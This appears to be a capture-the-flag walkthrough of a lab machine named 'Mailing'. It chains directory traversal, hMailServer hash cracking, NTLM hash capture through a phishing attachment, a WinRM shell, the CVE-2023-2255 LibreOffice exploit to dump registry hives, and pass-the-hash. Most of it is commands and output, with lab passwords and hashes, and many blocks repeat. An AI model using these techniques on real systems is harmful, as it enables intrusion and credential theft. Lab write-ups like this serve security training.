Browsing to the web application returns the following webpage:

Clicking the Downloads Instructions button downloads an instruction manual on how to setup mail clients depending on your OS. The usernames also stand out.

The web application is vulnerable to directory traversal. Using the file parameter, we can use it to download files on our machine:

http://mailing.htb/download.php?file=../download.php
http://mailing.htb/download.php?file=../download.php

The download.php contains the following code:

<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>

From the output above, we learn the file_path location is set to C:/wwwroot/instructions/'. Doing a directory search for files at /wwwroot does not result in anything interesting:

┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u "http://mailing.htb/download.php?file=../FUZZ" -e .html,.txt,.zip,.php,.ini,.bak,.sql -fw 3 -fs 1213

When searching for hMailServer credentials location, I obtained the following result:

And browsing to the following URL, I get a hit on the credentials of the hMailServer. The file contains the following:

[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

After cracking the hash using CrackStation, I get the password homenetworkingadministrator:

Using telnet, I gained access to the IMAP on the target machine. Then I logged in successfully using the obtained credentials:

┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ telnet mailing.htb 143                                                                                                                                          
Trying 10.129.73.85...
Connected to mailing.htb.
Escape character is '^]'.
* OK IMAPrev1
help
help BAD NULL COMMAND
login
login BAD NULL COMMAND
01 login administrator@mailing.htb homenetworkingadministrator
01 OK LOGIN completed
02 LIST "" *
* LIST (\HasNoChildren) "." "INBOX"
┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ telnet mailing.htb 143                                                                                                                                          
Trying 10.129.73.85...
Connected to mailing.htb.
Escape character is '^]'.
* OK IMAPrev1
help
help BAD NULL COMMAND
login
login BAD NULL COMMAND
01 login administrator@mailing.htb homenetworkingadministrator
01 OK LOGIN completed
02 LIST "" *
* LIST (\HasNoChildren) "." "INBOX"

From this, we learn that the email suffix is mailing.htb and this account belongs to the administrator.

After some enumeration, I followed the steps and installed Thunderbird on my machine. The question is what are their usernames for the email? However, the document answers the question itself:

We can attempt to target maya@mailing.htb.

Using ntlm_theft, generate a library-ms file to create the NTLMv2 hash. Attach the file inside the email and send it to maya:

Start up responder. Then once the email is opened, we should capture the NTLMv2 hash of maya:

[SMB] NTLMv2-SSP Client   : 10.129.73.85
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:2d47af642f1938ea:C6F94E67A3AFA52019AB65657697C599:0101000000000000008EA4E93098DC013B193C00F0463D880000000002000800300049004500360001001E00570049004E002D0031004700530034004B0058003100570045004E00410004003400570049004E002D0031004700530034004B0058003100570045004E0041002E0030004900450036002E004C004F00430041004C000300140030004900450036002E004C004F00430041004C000500140030004900450036002E004C004F00430041004C0007000800008EA4E93098DC0106000400020000000800300030000000000000000000000000200000D0760EE297C9B31719AD4E40C761D4A56D8A35471373824A72254AD28C374E890A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380032000000000000000000
[SMB] NTLMv2-SSP Client   : 10.129.73.85
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:2d47af642f1938ea:C6F94E67A3AFA52019AB65657697C599:0101000000000000008EA4E93098DC013B193C00F0463D880000000002000800300049004500360001001E00570049004E002D0031004700530034004B0058003100570045004E00410004003400570049004E002D0031004700530034004B0058003100570045004E0041002E0030004900450036002E004C004F00430041004C000300140030004900450036002E004C004F00430041004C000500140030004900450036002E004C004F00430041004C0007000800008EA4E93098DC0106000400020000000800300030000000000000000000000000200000D0760EE297C9B31719AD4E40C761D4A56D8A35471373824A72254AD28C374E890A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380032000000000000000000

Crack the hash to obtain the password m4y4ngs4ri of user maya:

MAYA::MAILING:2d47af642f1938ea:c6f94e67a3afa52019ab65657697c599:0101000000000000008ea4e93098dc013b193c00f0463d880000000002000800300049004500360001001e00570049004e002d0031004700530034004b0058003100570045004e00410004003400570049004e002d0031004700530034004b0058003100570045004e0041002e0030004900450036002e004c004f00430041004c000300140030004900450036002e004c004f00430041004c000500140030004900450036002e004c004f00430041004c0007000800008ea4e93098dc0106000400020000000800300030000000000000000000000000200000d0760ee297c9b31719ad4e40c761d4a56d8a35471373824a72254ad28c374e890a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380032000000000000000000:m4y4ngs4ri
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MAYA::MAILING:2d47af642f1938ea:c6f94e67a3afa52019ab...000000
MAYA::MAILING:2d47af642f1938ea:c6f94e67a3afa52019ab65657697c599:0101000000000000008ea4e93098dc013b193c00f0463d880000000002000800300049004500360001001e00570049004e002d0031004700530034004b0058003100570045004e00410004003400570049004e002d0031004700530034004b0058003100570045004e0041002e0030004900450036002e004c004f00430041004c000300140030004900450036002e004c004f00430041004c000500140030004900450036002e004c004f00430041004c0007000800008ea4e93098dc0106000400020000000800300030000000000000000000000000200000d0760ee297c9b31719ad4e40c761d4a56d8a35471373824a72254ad28c374e890a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380032000000000000000000:m4y4ngs4ri
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MAYA::MAILING:2d47af642f1938ea:c6f94e67a3afa52019ab...000000

And the credentials seems to work and they have WinRM privileges on the target machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ nxc smb mailing.htb -u maya -p m4y4ngs4ri                                    
SMB         10.129.73.85    445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:None)
SMB         10.129.73.85    445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ nxc winrm mailing.htb -u maya -p m4y4ngs4ri
WINRM       10.129.73.85    5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.73.85    5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ nxc smb mailing.htb -u maya -p m4y4ngs4ri                                    
SMB         10.129.73.85    445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:None)
SMB         10.129.73.85    445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ nxc winrm mailing.htb -u maya -p m4y4ngs4ri
WINRM       10.129.73.85    5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.73.85    5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)

Now I have a shell on the machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> whoami
mailing\maya
*Evil-WinRM* PS C:\Users\maya\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::6ab9:179b:f4f6:77d1
   Temporary IPv6 Address. . . . . . : dead:beef::f87b:18cb:5a45:46e5
   Link-local IPv6 Address . . . . . : fe80::d48a:d009:5711:bcb4%14

After some Googling, I noticed the LibreOffice installed on the machine is version 7.4.0.1 which is vulnerable to Local Privilege Escalation:

*Evil-WinRM* PS C:\Program Files\LibreOffice\program> more version.ini
[Version]
AllLanguages=en-US af am ar as ast be bg bn bn-IN bo br brx bs ca ca-valencia ckb cs cy da de dgo dsb dz el en-GB en-ZA eo es et eu fa fi fr fur fy ga gd gl gu gug he hsb hi hr hu id is it ja ka kab kk km kmr-Latn kn ko kok ks lb lo lt lv mai mk ml mn mni mr my nb ne nl nn nr nso oc om or pa-IN pl pt pt-BR ro ru rw sa-IN sat sd sr-Latn si sid sk sl sq sr ss st sv sw-TZ szl ta te tg th tn tr ts tt ug uk uz ve vec vi xh zh-CN zh-TW zu
buildid=43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
ExtensionUpdateURL=https://updateexte.libreoffice.org/ExtensionUpdateService/check.Update

UpdateChannel=

UpdateUserAgent=<PRODUCT> (${buildid}; ${_OS}; ${_ARCH}; <OPTIONAL_OS_HW_DATA>)
Vendor=The Document Foundation

Download the exploit and run it multiple times to get the hives. Remember that we must transfer the output document with the command to C:\Important Documents and execute it to run the payload:

*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> python.exe CVE-2023-2255.py --cmd "reg.exe save hklm\sam C:\Temp\sam.save" --output exp.odt
File exp.odt has been created !
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> 
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> python.exe CVE-2023-2255.py --cmd "reg.exe save hklm\system C:\Temp\system.save" --output exp.odt
File exp.odt has been created !
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> python.exe CVE-2023-2255.py --cmd "reg.exe save hklm\security C:\Temp\security.save" --output exp.odt
File exp.odt has been created !
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> 
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> python.exe CVE-2023-2255.py --cmd "reg.exe save hklm\sam C:\Temp\sam.save" --output exp.odt
File exp.odt has been created !
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> 
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> python.exe CVE-2023-2255.py --cmd "reg.exe save hklm\system C:\Temp\system.save" --output exp.odt
File exp.odt has been created !
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> python.exe CVE-2023-2255.py --cmd "reg.exe save hklm\security C:\Temp\security.save" --output exp.odt
File exp.odt has been created !
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255> copy exp.odt "C:\Important Documents\"
*Evil-WinRM* PS C:\Temp\exp\CVE-2023-2255>

*Evil-WinRM* PS C:\Important Documents> ./exp.odt

    Directory: C:\Important Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/7/2026   8:31 PM          30530 exp.odt

----                 -------------         ------ ----

Download the three hives over:

*Evil-WinRM* PS C:\Temp> download sam.save
                                        
Info: Downloading C:\Temp\sam.save to sam.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download security.save
                                        
Info: Downloading C:\Temp\security.save to security.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download system.save
                                        
Info: Downloading C:\Temp\system.save to system.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> 
*Evil-WinRM* PS C:\Temp> download sam.save
                                        
Info: Downloading C:\Temp\sam.save to sam.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download security.save
                                        
Info: Downloading C:\Temp\security.save to security.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download system.save
                                        
Info: Downloading C:\Temp\system.save to system.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp>

Extract the credentials from the three hives:

┌──(kali㉿kali)-[~/Desktop/Labs/Mailing]
└─$ impacket-secretsdump -system system.save -sam sam.save -security security.save local

Perform pass-the-hash and login as localadmin:

└─$ evil-winrm -i mailing.htb -u localadmin -H 9aa582783780d1546d62f2d102daefae
